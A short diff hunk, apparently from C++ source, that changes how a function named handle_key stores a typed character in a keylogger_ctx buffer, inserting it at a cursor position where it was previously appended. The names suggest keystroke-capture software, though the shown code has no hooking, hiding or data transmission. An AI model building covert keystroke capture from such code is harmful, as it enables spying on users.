@@ -90,8 +90,10 @@ void handle_key(struct keylogger_ctx *ctx)
         key_char -= 32;
     }
 
-    ctx->kb_buffer.emplace_back(key_char);
-    ctx->buffer_cursor++;
+    ctx->kb_buffer.insert(
+        ctx->kb_buffer.begin() + ctx->buffer_cursor++,
+        key_char
+    );
 
     std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
 }
